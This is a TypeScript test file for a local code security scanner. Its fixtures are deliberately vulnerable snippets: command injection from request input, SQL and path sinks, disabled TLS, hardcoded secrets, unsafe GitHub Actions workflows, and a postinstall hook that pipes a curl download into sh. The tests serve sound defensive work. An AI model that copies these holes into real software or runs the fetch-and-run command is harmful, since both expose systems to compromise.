import { afterEach, describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { scanSecurity } from "../../src/services/security/scanner";
import { renderSecurityReport } from "../../src/services/security/report";

const roots: string[] = [];
afterEach(async () => Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true }))));

describe("local security scanner", () => {
  test("reports secrets and disabled TLS with redacted credential evidence", async () => {
    const root = await mkdtemp(join(tmpdir(), "tnb-security-"));
    roots.push(root);
    await mkdir(join(root, "src"));
    await writeFile(join(root, "src", "bad.ts"), [
      'const password = "super-secret-value";',
      "const tls = { rejectUnauthorized: false };",
    ].join("\n"));
    const result = await scanSecurity({ cwd: root, paths: ["src"] });
    expect(result.scannedFiles).toBe(1);
    expect(result.findings.map((finding) => finding.rule)).toEqual(["generic-secret", "disabled-tls-verification"]);
    expect(result.findings[0]?.evidence).toBe("[redacted potential secret]");
  });

  test("rejects scan paths outside the workspace", async () => {
    const root = await mkdtemp(join(tmpdir(), "tnb-security-"));
    roots.push(root);
    await expect(scanSecurity({ cwd: root, paths: ["../outside.ts"] })).rejects.toThrow("escapes workspace");
  });

  test("loads project rules, filters paths, and reports diff-base metadata", async () => {
    const root = await mkdtemp(join(tmpdir(), "tnb-security-"));
    roots.push(root);
    await mkdir(join(root, "src"), { recursive: true });
    await mkdir(join(root, "scripts"), { recursive: true });
    await mkdir(join(root, ".codesec"), { recursive: true });
    await git(root, ["init", "-q"]);
    await git(root, ["config", "user.email", "tnb@example.invalid"]);
    await git(root, ["config", "user.name", "tnb test"]);
    await writeFile(join(root, "src", "safe.ts"), "export const safe = true;\n");
    await git(root, ["add", "."]);
    await git(root, ["commit", "-qm", "base"]);
    const baseCommit = (await git(root, ["rev-parse", "HEAD"])).trim();

    await writeFile(join(root, ".codesec", "security-patterns.yaml"), [
      "- ruleName: no-debug-cookie",
      '  substrings: ["debugCookie("]',
      '  path_glob: "src/**/*.ts"',
      "  severity: HIGH",
      '  reminder: "Debug cookie helpers must not ship in production paths."',
    ].join("\n"));
    await writeFile(join(root, "src", "unsafe.ts"), "debugCookie(token);\n");
    await writeFile(join(root, "scripts", "unsafe.ts"), "debugCookie(token);\n");

    const result = await scanSecurity({
      cwd: root,
      baseCommit,
      pathGlob: "**/*.ts",
      excludePaths: ["scripts/"],
    });

    expect(result.scope.mode).toBe("diff");
    expect(result.scope.baseCommit).toBe(baseCommit);
    expect(result.scope.pathGlob).toBe("**/*.ts");
    expect(result.scope.excludePaths).toEqual(["scripts/"]);
    expect(result.scope.requestedPaths).toEqual(expect.arrayContaining([
      ".codesec/security-patterns.yaml",
      "scripts/unsafe.ts",
      "src/unsafe.ts",
    ]));
    expect(result.rules.customProject).toBe(1);
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]).toMatchObject({
      rule: "no-debug-cookie",
      source: "project",
      severity: "high",
      cwe: "CUSTOM",
      path: "src/unsafe.ts",
      line: 1,
    });
  });

  test("traces external input through a project function into a command sink", async () => {
    const root = await mkdtemp(join(tmpdir(), "tnb-security-"));
    roots.push(root);
    await mkdir(join(root, "src"), { recursive: true });
    await writeFile(join(root, "src", "runner.ts"), [
      'import { exec } from "node:child_process";',
      "export function runCommand(command: string) { exec(command); }",
    ].join("\n"));
    await writeFile(join(root, "src", "route.ts"), [
      'import { runCommand } from "./runner";',
      "export function route(req: any) { runCommand(req.query.command); }",
    ].join("\n"));

    const result = await scanSecurity({ cwd: root, paths: ["src"] });
    expect(result.findings).toContainEqual(expect.objectContaining({
      rule: "ast-call-chain-ast-request-to-command",
      path: "src/route.ts",
      severity: "high",
      confidence: "medium",
    }));
  });

  test("reports privileged workflow interpolation and remote install scripts", async () => {
    const root = await mkdtemp(join(tmpdir(), "tnb-security-"));
    roots.push(root);
    await mkdir(join(root, ".github", "workflows"), { recursive: true });
    await writeFile(join(root, ".github", "workflows", "review.yml"), [
      "on: pull_request_target",
      "jobs:",
      "  review:",
      "    steps:",
      "      - run: echo ${{ github.event.pull_request.title }}",
      "      - uses: actions/checkout@v4",
      "        with:",
      "          ref: ${{ github.event.pull_request.head.sha }}",
    ].join("\n"));
    await writeFile(join(root, "package.json"), JSON.stringify({
      scripts: { postinstall: "curl https://example.invalid/install.sh | sh" },
      dependencies: { floating: "latest" },
    }, null, 2));

    const result = await scanSecurity({ cwd: root, paths: [".github", "package.json"] });
    expect(result.findings.map(({ rule }) => rule)).toEqual(expect.arrayContaining([
      "github-actions-script-injection",
      "pull-request-target-untrusted-checkout",
      "remote-install-script",
      "unbounded-dependency-version",
    ]));
  });

  test("reports multi-language findings and emits Markdown and SARIF", async () => {
    const root = await mkdtemp(join(tmpdir(), "tnb-security-"));
    roots.push(root);
    await writeFile(join(root, "runner.py"), 'subprocess.run(command, shell=True)\n');
    await writeFile(join(root, "Runner.java"), 'Runtime.getRuntime().exec(request.getParameter("cmd"));\n');
    await writeFile(join(root, "unsafe.c"), 'void copy(char *dst, char *src) { strcpy(dst, src); }\n');
    await writeFile(join(root, "Wallet.sol"), 'require(tx.origin == owner);\n');

    const result = await scanSecurity({ cwd: root, paths: ["."] });
    expect(result.findings.map(({ rule }) => rule)).toEqual(expect.arrayContaining([
      "python-shell-true", "java-runtime-exec", "c-unsafe-copy", "solidity-tx-origin",
    ]));
    expect(result.summary.languages).toMatchObject({ python: 1, c: 1, solidity: 1 });
    expect(result.summary.languages.java).toBeGreaterThanOrEqual(1);
    expect(renderSecurityReport(result, "markdown")).toContain("# Security Review");
    const sarif = JSON.parse(renderSecurityReport(result, "sarif"));
    expect(sarif.version).toBe("2.1.0");
    expect(sarif.runs[0].results).toHaveLength(result.findings.length);
  });

  test("tracks external values through local assignments in Python, Go, and Java", async () => {
    const root = await mkdtemp(join(tmpdir(), "tnb-security-"));
    roots.push(root);
    await writeFile(join(root, "runner.py"), [
      'command = request.args["command"]',
      "normalized = command.strip()",
      "subprocess.run(normalized)",
    ].join("\n"));
    await writeFile(join(root, "reader.go"), [
      "package main",
      'path := r.URL.Query().Get("path")',
      "clean := strings.TrimSpace(path)",
      "os.ReadFile(clean)",
    ].join("\n"));
    await writeFile(join(root, "Query.java"), [
      'String value = request.getParameter("name");',
      "String sql = value.trim();",
      "statement.execute(sql);",
    ].join("\n"));
    await writeFile(join(root, "safe.py"), [
      'unused = request.args["value"]',
      'subprocess.run(["git", "status"])',
    ].join("\n"));

    const result = await scanSecurity({ cwd: root, paths: ["."] });
    expect(result.findings).toContainEqual(expect.objectContaining({
      rule: "request-to-shell", path: "runner.py", line: 3, language: "python",
    }));
    expect(result.findings).toContainEqual(expect.objectContaining({
      rule: "request-to-file", path: "reader.go", line: 4, language: "go",
    }));
    expect(result.findings).toContainEqual(expect.objectContaining({
      rule: "request-to-sql", path: "Query.java", line: 3, language: "java",
    }));
    expect(result.findings.some(({ rule, path }) => rule === "request-to-shell" && path === "safe.py")).toBe(false);
  });

  test("tracks request data through project functions in Python, Go, Java, and Rust", async () => {
    const root = await mkdtemp(join(tmpdir(), "tnb-security-"));
    roots.push(root);
    await writeFile(join(root, "runner.py"), "def run_command(command):\n    subprocess.run(command)\n");
    await writeFile(join(root, "route.py"), 'run_command(request.args["command"])\n');
    await writeFile(join(root, "runner.go"), "package main\nfunc runCommand(command string) { exec.Command(\"sh\", \"-c\", command) }\n");
    await writeFile(join(root, "route.go"), 'package main\nfunc route() { runCommand(r.FormValue("command")) }\n');
    await writeFile(join(root, "Runner.java"), "class Runner {\n  void runSql(String sql) { statement.execute(sql); }\n}\n");
    await writeFile(join(root, "Route.java"), 'class Route {\n  void route() { runSql(request.getParameter("q")); }\n}\n');
    await writeFile(join(root, "runner.rs"), "fn open_path(path: String) { open(path); }\n");
    await writeFile(join(root, "route.rs"), 'fn route() { open_path(req.query("path")); }\n');
    await writeFile(join(root, "multi.py"), "def run_with_label(label, command):\n    subprocess.run(command)\n");
    await writeFile(join(root, "multi_route.py"), 'run_with_label("safe", request.args["command"])\n');

    const result = await scanSecurity({ cwd: root, paths: ["."] });
    expect(result.findings).toContainEqual(expect.objectContaining({ rule: "syntax-call-chain-request-to-shell", path: "route.py" }));
    expect(result.findings).toContainEqual(expect.objectContaining({ rule: "syntax-call-chain-request-to-shell", path: "route.go" }));
    expect(result.findings).toContainEqual(expect.objectContaining({ rule: "syntax-call-chain-request-to-sql", path: "Route.java" }));
    expect(result.findings).toContainEqual(expect.objectContaining({ rule: "syntax-call-chain-request-to-file", path: "route.rs" }));
    expect(result.findings).toContainEqual(expect.objectContaining({ rule: "syntax-call-chain-request-to-shell", path: "multi_route.py" }));
    expect(result.findings.some(({ rule, path }) => rule === "request-to-sql" && path === "route.rs")).toBe(false);
  });
});

async function git(cwd: string, args: string[]): Promise<string> {
  const child = Bun.spawn(["git", ...args], { cwd, stdout: "pipe", stderr: "pipe" });
  const [stdout, stderr, code] = await Promise.all([
    new Response(child.stdout).text(),
    new Response(child.stderr).text(),
    child.exited,
  ]);
  if (code !== 0) throw new Error(stderr);
  return stdout;
}
